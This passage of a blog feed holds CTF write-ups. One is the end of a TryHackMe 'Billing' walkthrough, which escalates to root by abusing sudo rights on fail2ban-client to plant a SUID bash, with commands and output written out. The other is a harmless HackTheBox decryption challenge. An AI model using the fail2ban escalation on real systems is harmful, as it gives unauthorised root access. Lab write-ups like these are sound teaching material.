+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="err">$</span>
+</code></pre></div></div>
+<h1 id="user-flag">User Flag</h1>
+<p>The user flag was straightforward. Upon checking the <code class="language-plaintext highlighter-rouge">/home/</code> directory we see that anybody can read the directory and the user flag present inside was also readable.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>asterisk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>asterisk<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>asterisk<span class="o">)</span>
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /home
+total 4
+drwxr-xr-x 15 magnus magnus 4096 Sep  9  2024 magnus
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /home/magnus/
+total 36
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Desktop
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Documents
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Downloads
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Music
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Pictures
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Public
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Templates
+drwx------ 2 magnus magnus 4096 Mar 27  2024 Videos
+<span class="nt">-rw-r--r--</span> 1 magnus magnus   38 Mar 27  2024 user.txt
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">cat</span> /home/magnus/user.txt
+THM<span class="o">{</span>4a..REDACTED..ca<span class="o">}</span>
+</code></pre></div></div>
+
+<h1 id="root-flag">Root Flag</h1>
+
+<p>Once I get a foothold or user flag, one of the first things I do is check what can I run as a superuser. And luckily enough we do have permission to run certain application as <code class="language-plaintext highlighter-rouge">sudo</code>.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>asterisk on Billing:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+Runas and Command-specific defaults <span class="k">for </span>asterisk:
+    Defaults!/usr/bin/fail2ban-client <span class="o">!</span>requiretty
+
+User asterisk may run the following commands on Billing:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/fail2ban-client
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="fail2ban">Fail2Ban</h2>
+<p>Okay so what is <code class="language-plaintext highlighter-rouge">Fail2Ban</code>? It’s an open-source intrusion prevention software that protects Linux servers from malicious attacks, <strong>particularly brute-force attacks</strong>. Hmm, maybe that’s why the room said bruteforcing was not allowed. Okay so upon looking up its basic functionality, we find that we can configure an action it does upon successfully blocking something.</p>
+
+<h3 id="abusing-fail2ban">Abusing Fail2Ban</h3>
+
+<p>Upon checking the manual pages we find this interesting option:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>fail2ban-client <span class="nb">set</span> &lt;JAIL&gt; action &lt;ACT&gt; actionban &lt;ACT&gt; &lt;COMMAND&gt;
+</code></pre></div></div>
+<p>This configures the command to execute if certain action is executed on the specified service. We can try to add the “action” into the configuration file of the application, but we can rather directly type the command on the command-line. My action plan is to copy <code class="language-plaintext highlighter-rouge">bash</code> to a temporary directoy and setting SUID bit on itself to gain privileged shell.</p>
+
+<p>In order to do that we can:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/fail2ban-client restart
+&lt;g/lib/icepay<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/fail2ban-client restart
+Shutdown successful
+Server ready
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/fail2ban-client <span class="nb">set </span>sshd action iptables-multiport actionban <span class="s2">"/usr/bin/cp /bin/bash /tmp &amp;&amp; chmod 4755 /tmp/bash"</span>
+/usr/bin/cp /bin/bash /tmp <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>4755 /tmp/bash
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/fail2ban-client <span class="nb">set </span>sshd banip 127.0.0.1
+&lt;o /usr/bin/fail2ban-client <span class="nb">set </span>sshd banip 127.0.0.1
+1
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp
+<span class="nb">ls</span> <span class="nt">-l</span> /tmp
+total 1208
+<span class="nt">-rwsr-xr-x</span> 1 root root 1234376 May 21 13:19 bash
+asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="err">$</span>
+</code></pre></div></div>
+
+<p>And with that we got a SUID bash ready to be executed!</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Simply executing this <code class="language-plaintext highlighter-rouge">bash</code> with the <code class="language-plaintext highlighter-rouge">-p</code> flag will give us a privileged shell with which we can read root flag.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asterisk@Billing:/var/www/html/mbilling/lib/icepay<span class="nv">$ </span>/tmp/bash <span class="nt">-p</span>
+bash-5.1# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>asterisk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>asterisk<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>asterisk<span class="o">)</span>
+bash-5.1# <span class="nb">cat</span> /root/root.txt
+THM<span class="o">{</span>33...REDACTED...60<span class="o">}</span>
+bash-5.1#
+</code></pre></div></div>
+
+<h1 id="extra">Extra</h1>
+<p>Remember we were warned against bruteforcing. But if we were allowed, we would have come across their README file.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> http://billing.thm/mbilling/FUZZ
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://billing.thm/mbilling/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+LICENSE                 [Status: 200, Size: 7652, Words: 1404, Lines: 166, Duration: 95ms]
+.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2175ms]
+README.md               [Status: 200, Size: 1995, Words: 152, Lines: 66, Duration: 100ms]
+akeeba.backend.log      [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 95ms]
+.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4220ms]
+.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4221ms]
+archive                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 95ms]
+assets                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 95ms]
+development.log         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 99ms]
+fpdf                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 95ms]
+index.html              [Status: 200, Size: 30760, Words: 1501, Lines: 137, Duration: 108ms]
+index.php               [Status: 200, Size: 663, Words: 46, Lines: 1, Duration: 129ms]
+lib                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 222ms]
+production.log          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 98ms]
+protected               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 103ms]
+resources               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 93ms]
+spamlog.log             [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 97ms]
+tmp                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 98ms]
+:: Progress: [4745/4745] :: Job [1/1] :: 416 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p>And upon checking the README we would have confirmed they are using the vulnerable version.
+<img src="/ctf-vault/assets/images/articles/mbilling-version.png" alt="Image" class="rounded" /></p>]]></content><author><name>Mehul Singh</name></author><category term="thm" /><category term="magnusbilling" /><category term="rce" /><category term="sudo" /><category term="fail2ban" /><category term="nmap" /><category term="ffuf" /><category term="metasploit" /><category term="msfconsole" /><summary type="html"><![CDATA[Solving an easy room on the TryHackMe platform.]]></summary></entry><entry><title type="html">BabyEncryption - HackTheBox RE Challenge writeup</title><link href="http://0.0.0.0:4000/ctf-vault/BabyEncryption-RE.htb" rel="alternate" type="text/html" title="BabyEncryption - HackTheBox RE Challenge writeup" /><published>2024-07-14T00:00:00+05:30</published><updated>2024-07-14T00:00:00+05:30</updated><id>http://0.0.0.0:4000/ctf-vault/BabyEncryption-RE.htb</id><content type="html" xml:base="http://0.0.0.0:4000/ctf-vault/BabyEncryption-RE.htb"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>This time we will be focusing on a very simple reverse engineering challenge on HackTheBox called “BabyEncryption”. What made me want to write this post for it was the fact that how being lazy can sometimes (emphasis on ‘sometimes’!) show you new ways to do the same task. So let’s begin.</p>
+
+<h1 id="write-up">Write-up</h1>
+
+<p>Let’s begin with the simplest and, I think, the intended way. So once we download, check and unzip the files, we see the following python encryption file.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">string</span>
+<span class="kn">from</span> <span class="n">secret</span> <span class="kn">import</span> <span class="n">MSG</span>
+
+<span class="k">def</span> <span class="nf">encryption</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="n">ct</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="n">ct</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="mi">123</span> <span class="o">*</span> <span class="n">char</span> <span class="o">+</span> <span class="mi">18</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
+
+<span class="n">ct</span> <span class="o">=</span> <span class="nf">encryption</span><span class="p">(</span><span class="n">MSG</span><span class="p">)</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./msg.enc</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">ct</span><span class="p">.</span><span class="nf">hex</span><span class="p">())</span>
+<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>And if we directly run it, we can’t as there is no module name <code class="language-plaintext highlighter-rouge">secret</code>. But we can see that we don’t actually need to make the program run if we can simply reverse engineer the code. So if we check the code we find that to encrypt the code, each letter is changed to its ASCII number (most probably), denoted by <code class="language-plaintext highlighter-rouge">char</code> here  and then the following calculation is done on it.</p>
+
+\[arr[i]=(123 \times char+18) \% 256\]
+
+<p>And once each calculated value is store in the list, it is returned as an immutable bytes object, and this byte value is converted to hex before being saved as the encrypted value in msg.enc.</p>
+
+<h2 id="1-lets-solve-math">#1. Let’s solve Math</h2>
+
+<p>So if we want to reverse engineer the code, we need to remember what modulus function is. One of the basic definition allows us to write any modulus function as below:</p>
+
+\[divident \% divisor = remainder\]
+
+\[(divisor \times quotient)+remainder=divident\]
+
+<p>Then we can reverse each calculation with the following pseudo-code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">encoded_msg</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">some</span> <span class="nb">range</span> <span class="n">of</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">quotient</span><span class="p">:</span>
+        <span class="nf">if </span><span class="p">((</span><span class="mi">256</span><span class="o">*</span><span class="n">m</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="o">-</span><span class="mi">18</span><span class="p">)</span><span class="o">%</span><span class="mi">123</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="c1">#append ascii character
+</span></code></pre></div></div>
+
+<p>And our final code will look like this.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">decryption</span><span class="p">(</span><span class="n">hidden</span><span class="p">):</span>
+    <span class="n">arr</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">hidden</span><span class="p">))</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arr</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+            <span class="nf">if </span><span class="p">((</span><span class="mi">256</span><span class="o">*</span><span class="n">m</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="o">-</span><span class="mi">18</span><span class="p">)</span><span class="o">%</span><span class="mi">123</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">msg</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(((</span><span class="mi">256</span><span class="o">*</span><span class="n">m</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="o">-</span><span class="mi">18</span><span class="p">)</span><span class="o">//</span><span class="mi">123</span><span class="p">))</span>
+                <span class="k">break</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
+
+
+<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./msg.enc</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">hidden</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="nf">decryption</span><span class="p">(</span><span class="n">hidden</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="2-lets-not-solve-math">#2. Let’s not solve math</h2>
+
+<p>Like me, if you want to avoid the brainwork and trade-it off with a bit longer easier work, we need to think of other ways. And one thing we know is that every flag will be in printable characters. So if we just make a dictionary of each possible character we can map the same calculation in the encryption as its key. This way we can replace each value from the numerical array to characters by simply looking up our dictionary!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">special</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">!</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">@</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">$</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">%</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">^</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">&amp;</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">*</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">)</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">{</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="se">\\</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">dic</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="c1"># Adding all alphabets
+</span><span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">),</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">z</span><span class="sh">'</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span> <span class="nf">range</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">),</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">Z</span><span class="sh">'</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)):</span>
+    <span class="n">mutation_i</span> <span class="o">=</span> <span class="p">(</span><span class="mi">123</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">18</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span><span class="p">;</span> <span class="n">mutation_j</span> <span class="o">=</span> <span class="p">(</span><span class="mi">123</span><span class="o">*</span><span class="n">j</span><span class="o">+</span><span class="mi">18</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span>
+    <span class="n">dic</span><span class="p">[</span><span class="n">mutation_i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">dic</span><span class="p">[</span><span class="n">mutation_j</span><span class="p">]</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+
+<span class="c1"># Adding all numbers
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
+    <span class="n">mutation_i</span> <span class="o">=</span> <span class="p">(</span><span class="mi">123</span><span class="o">*</span><span class="nf">ord</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">+</span><span class="mi">18</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span>
+    <span class="n">dic</span><span class="p">[</span><span class="n">mutation_i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="c1">#Adding special characters
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">special</span><span class="p">:</span>
+    <span class="n">mutation_i</span> <span class="o">=</span> <span class="p">(</span><span class="mi">123</span><span class="o">*</span><span class="nf">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="mi">18</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span>
+    <span class="n">dic</span><span class="p">[</span><span class="n">mutation_i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
+
+<span class="k">def</span> <span class="nf">decryption</span><span class="p">(</span><span class="n">msg_encoded</span><span class="p">):</span>
+    <span class="n">msg_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">msg_encoded</span><span class="p">)</span>
+    <span class="n">msg_arr</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">msg_bytes</span><span class="p">)</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">msg_arr</span><span class="p">:</span>
+        <span class="n">msg</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">dic</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./msg.enc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="nf">decryption</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>And this gives us the decrypted message as well!</p>
+
+<p><img src="/ctf-vault/assets/images/articles/bb.png" alt="Image" class="rounded" /></p>]]></content><author><name>Mehul Singh</name></author><category term="htb" /><category term="reverse engineering" /><category term="python" /><summary type="html"><![CDATA[Solving a very simple RE challenge on the HackTheBox platform. Could we reverse engineer without actually reverse engineering a code?]]></summary></entry></feed>
